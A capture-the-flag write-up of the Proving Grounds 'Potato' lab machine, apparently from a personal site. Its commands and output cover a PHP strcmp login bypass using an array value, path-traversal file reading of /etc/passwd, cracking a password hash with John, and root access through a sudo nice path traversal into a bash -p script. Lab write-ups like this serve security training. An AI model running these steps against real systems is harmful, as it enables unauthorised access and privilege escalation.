---
layout: default
title: Potato
parent: Proving Grounds Play
nav_order: 29
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/potato]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.222.101
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-08 13:42 EST
Nmap scan report for 192.168.222.101
Host is up (0.055s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ef:24:0e:ab:d2:b3:16:b4:4b:2e:27:c0:5f:48:79:8b (RSA)
|   256 f2:d8:35:3f:49:59:85:85:07:e6:a2:0e:65:7a:8c:4b (ECDSA)
|_  256 0b:23:89:c3:c0:26:d5:64:5e:93:b7:ba:f5:14:7f:3e (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Potato company
|_http-server-header: Apache/2.4.41 (Ubuntu)
2112/tcp open  ftp     ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak
|_-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.37 seconds

```

# Enumeration

---

## 2112 | FTP

Connect with _anonymous_ logon and download two files:

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/potato]
└─$ ftp 192.168.222.101 2112
Connected to 192.168.222.101.
220 ProFTPD Server (Debian) [::ffff:192.168.222.101]
Name (192.168.222.101:vagrant): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230-Welcome, archive user anonymous@192.168.45.217 !
230-
230-The local time is: Wed Nov 08 18:45:24 2023
230-                                                                                                    230 Anonymous access granted, restrictions apply
Remote system type is UNIX.                                                                             Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||44129|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak
-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg
226 Transfer complete
ftp> get welcome.msg
local: welcome.msg remote: welcome.msg
229 Entering Extended Passive Mode (|||16411|)
150 Opening BINARY mode data connection for welcome.msg (54 bytes)
    54      527.34 KiB/s
226 Transfer complete
54 bytes received in 00:00 (0.94 KiB/s)
ftp> get index.php.bak
local: index.php.bak remote: index.php.bak
229 Entering Extended Passive Mode (|||24379|)
150 Opening BINARY mode data connection for index.php.bak (901 bytes)
   901       17.53 MiB/s
226 Transfer complete
901 bytes received in 00:00 (14.72 KiB/s)

```

Read the _welcome.msg_ file

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/potato]
└─$ cat welcome.msg
Welcome, archive user %U@%R !

The local time is: %T
```

Read the _index.php.bak_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/potato]                                                         └─$ cat index.php.bak
<html>                                                                                                  <head></head>
<body>

<?php

$pass= "potato"; //note Change this password regularly

if($_GET['login']==="1"){
  if (strcmp($_POST['username'], "admin") == 0  && strcmp($_POST['password'], $pass) == 0) {
    echo "Welcome! </br> Go to the <a href=\"dashboard.php\">dashboard</a>";
    setcookie('pass', $pass, time() + 365*24*3600);
  }else{
    echo "<p>Bad login/password! </br> Return to the <a href=\"index.php\">login page</a> <p>";
  }
  exit();
}
?>


  <form action="index.php?login=1" method="POST">
                <h1>Login</h1>
                <label><b>User:</b></label>
                <input type="text" name="username" required>
                </br>
                <label><b>Password:</b></label>
                <input type="password" name="password" required>
                </br>
                <input type="submit" id='submit' value='Login' >
  </form>
</body>
</html>
```

# Exploitation

---

## Bypass Login Process with Burp

We are provided the source code for the login page.

The login page uses _strcmp_ to compare the username to the string value of _admin_ and the password value to the stored
variable for the _$pass_ value. If both of those values are _True_ then the login process completes successfully.

```bash
strcmp($_POST['username'], "admin") == 0  && strcmp($\_POST['password'], $pass) == 0)
```

We can exploit this string compare (_strcmp_) operation by comparing a NULL value to a string which returns a NULL, which
is the same as a '0'.

This can be done by setting the _password_ value to an array by intercepting the login request in Burp.

![login](../../../assets/images/ctfs/proving_grounds/potato/login.png)

Intercept the login request and change the password value to an array.

![burp](../../../assets/images/ctfs/proving_grounds/potato/burp.png)

We get a successful login reponse from the server and enter the admin area.

![success](../../../assets/images/ctfs/proving_grounds/potato/success.png)

## LFI in Admin Page (Authenticated)

Looking at the _/log_ page is has _page=log_ in the URL which could be susceptible to LFI.

![logs](../../../assets/images/ctfs/proving_grounds/potato/logs.png)

If we intercept in Burp we can see there is a _file_ parameter.

![burp2](../../../assets/images/ctfs/proving_grounds/potato/burp2.png)

Adjust to _../../../../../../../etc/passwd_ and get the password file from the target.

![burp3](../../../assets/images/ctfs/proving_grounds/potato/burp3.png)

We can grab the _webadmin_ hash and crack in John.

![burp4](../../../assets/images/ctfs/proving_grounds/potato/burp4.png)

Get the hash format for John from _name-that-hash_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/potato]
└─$ nth --file hash.txt

  _   _                           _____ _           _          _   _           _
 | \ | |                         |_   _| |         | |        | | | |         | |
 |  \| | __ _ _ __ ___   ___ ______| | | |__   __ _| |_ ______| |_| | __ _ ___| |__
 | . ` |/ _` | '_ ` _ \ / _ \______| | | '_ \ / _` | __|______|  _  |/ _` / __| '_ \
 | |\  | (_| | | | | | |  __/      | | | | | | (_| | |_       | | | | (_| \__ \ | | |
 \_| \_/\__,_|_| |_| |_|\___|      \_/ |_| |_|\__,_|\__|      \_| |_/\__,_|___/_| |_|

https://twitter.com/bee_sec_san
https://github.com/HashPals/Name-That-Hash


$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/

Most Likely
MD5 Crypt, HC: 500 JtR: md5crypt
Cisco-IOS(MD5), HC: 500 JtR: md5crypt
FreeBSD MD5, HC: 500 JtR: md5crypt


```

Now we can crack with John.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/potato]
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 SSE2 4x3])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
dragon           (?)
1g 0:00:00:00 DONE (2023-11-08 22:48) 12.50g/s 1800p/s 1800c/s 1800C/s 123456..sandra
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We get the password _dragon_ and can authenticate to the SSH service as the _webadmin_ user.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/potato]
└─$ ssh webadmin@192.168.222.101

webadmin@serv:~$ id
uid=1001(webadmin) gid=1001(webadmin) groups=1001(webadmin)

```

# Post-Exploitation

---

## Sudo -l

```bash
webadmin@serv:/home/florianges$ sudo -l
Matching Defaults entries for webadmin on serv:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on serv:
    (ALL : ALL) /bin/nice /notes/*

```

We can run _/bin/nice_ with sudo privileges against anything after _/notes/_.

If we place a script to execute a _/bin/bash_ shell in our _/home/webadmin_ directory we should get a shell with root privileges.

```bash
webadmin@serv:~$ vi evil.sh

# write a simple /bin/bash script
#!/bin/bash

/bin/bash -p

# Make the script executable
chmod +x evil.sh

# Execute and get elevated privileges
webadmin@serv:~$ sudo /bin/nice /notes/../home/webadmin/evil.sh
root@serv:/home/webadmin# id
uid=0(root) gid=0(root) groups=0(root)


```
